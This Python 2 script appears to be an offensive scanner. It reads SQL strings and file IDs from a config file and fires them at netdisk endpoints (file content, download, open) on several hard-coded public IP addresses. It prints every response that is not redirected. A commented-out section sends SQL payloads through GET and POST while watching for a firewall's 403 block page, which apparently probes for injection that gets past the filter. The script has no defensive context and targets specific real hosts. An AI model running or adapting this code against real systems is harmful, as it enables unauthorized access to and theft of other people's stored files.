#*--coding:utf-8--*
from os import popen

import requests
import yaml
import json

readyml = yaml.load(file('ini.yml'))
api_url = readyml['api']
sql = readyml['sql']
fid = readyml['fid']
'''
print(sql)
data = {
    'id': 'select * from sdfsf',
    'kw': '丛莱绿茶'
}
m = 0
for x in api_url.split(' '):
    for y in sql.split('; '):
        data = {
            'id': '%s' % y,
            'kw': '丛莱绿茶'
        }
        try:
            res_get = requests.get(x, params=data)
            res_post = requests.post(x, data=data)
            # print(res_get.history,res_post.history)
            if res_get.url != 'http://202.108.1.122/403.html':
            # if res_get.status_code == 500:
                m += 1
                print(y)
                print(res_get.url)
                print(res_get.status_code)

            if res_post.url != 'http://202.108.1.122/403.html':
                print(res_post.url)
                print(res_post.history)
        except:
            print(x)
        # print(res_post.text)
        # print(res_post.status_code)
        # print(res_post.history)

print(m)
        # print(res.content)
        # raw_input()
'''

def fids(ip, keyword, fid):
    urls = [
    'http://%s/space/netdisk/index.php?op=f_filecontent&igId=%s&fid=%s' % (ip, keyword, fid),
    'http://%s/space/netdisk/index.php?op=f_downloadfile&igId=%s&fid=%s' %(ip, keyword, fid),
    'http://%s/space/netdisk/index.php?op=f_openfile&igId=%s&fid=%s' % (ip, keyword, fid)
    ]
    for url in urls:
        # print url
        res = requests.get(url)
        if res.history == []:
            print url
            print res.content

print sql.split(';')
ips = [
    '202.108.33.171',
    '202.108.33.176',
    '202.108.33.224',
    '202.108.33.233',
    '103.29.134.108',
    '103.29.134.109'
       ]

for m in ips:
    for x in sql.split(';'):
        fids(m, u"小兔子乖乖", x)

    # print fid.split('=>')
    for y in fid.split('=>'):
        fids(m, u'小兔子乖乖', y)

    print m + "-------------------------------"